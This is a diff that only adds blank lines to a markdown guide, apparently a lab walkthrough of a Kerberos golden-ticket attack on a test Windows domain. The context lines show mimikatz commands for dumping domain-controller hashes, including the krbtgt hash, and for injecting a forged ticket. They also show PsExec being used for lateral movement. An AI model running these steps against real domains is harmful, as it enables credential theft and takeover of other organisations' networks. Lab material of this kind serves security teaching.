@@ -774,6 +774,7 @@ LAB\nonexistentuser
 ## 5.1. Dump password hashes on domain controller
 - Requires `Domain Admins` rights
 - Information of interest: domain SID and `krbtgt` password hash
+
 ```console
 mimikatz # privilege::debug
 Privilege '20' OK
@@ -871,6 +872,7 @@ NTLM : e2c3ed7139fd3efd244df58c9b2aeb6b
 - This can be performed on any domain member machine, without administrator rights
 - ☝️ **Note**: it is important to run `kerberos::purge` even if `klist` show zero cached tickets
 - The `misc::cmd` command opens a command prompt session with the golden ticket injected to that session
+
 ```console
 mimikatz # kerberos::purge
 Ticket(s) purge for current session is OK
@@ -899,6 +901,7 @@ Patch OK for 'cmd.exe' from 'DisableCMD' to 'KiwiAndCMD' @ 00007FF6FF396438
 
 ## 5.3. Use the golden ticket to laterally move to **any** domain machine
 - Verify golden ticket in session
+
 ```console
 C:\Users\john>hostname
 CLIENT
@@ -934,6 +937,7 @@ Cached Tickets: (1)
 ```
 
 - Attempt to connect to domain member machine
+
 ```console
 C:\Users\john>PsExec.exe \\SVR.lab.vx cmd.exe
 
